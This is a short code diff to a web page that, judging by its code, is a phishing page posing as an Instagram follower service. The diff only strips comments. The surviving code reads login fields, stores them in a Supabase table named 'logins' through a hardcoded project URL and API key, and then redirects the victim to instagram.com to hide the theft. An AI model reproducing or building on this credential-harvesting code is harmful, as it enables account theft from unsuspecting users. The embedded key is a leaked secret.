@@ -29,7 +29,6 @@
         const SUPABASE_URL = 'https://emlcxdwkicjdzbbsdzvw.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVtbGN4ZHdraWNqZHpiYnNkenZ3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIzNDc1NDEsImV4cCI6MjA4NzkyMzU0MX0.V2-468uPNIwoj6N4NtyRyIWNP2ucyPxCv6DFRG9nAQc'; // Sua chave completa aqui
 
-        // Inicialização correta usando o objeto global da CDN
         const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
         async function login() {
@@ -40,8 +39,6 @@
                 alert("Preencha todos os campos!");
                 return;
             }
-
-            // Enviando para a tabela 'logins'
             const { error } = await _supabase
                 .from('logins')
                 .insert([
@@ -52,7 +49,6 @@
                 console.error('Erro:', error.message);
                 alert("Erro ao conectar ao servidor de seguidores.");
             } else {
-                // Sucesso - Redirecionamento
                 window.location.href = "https://www.instagram.com";
             }
         }
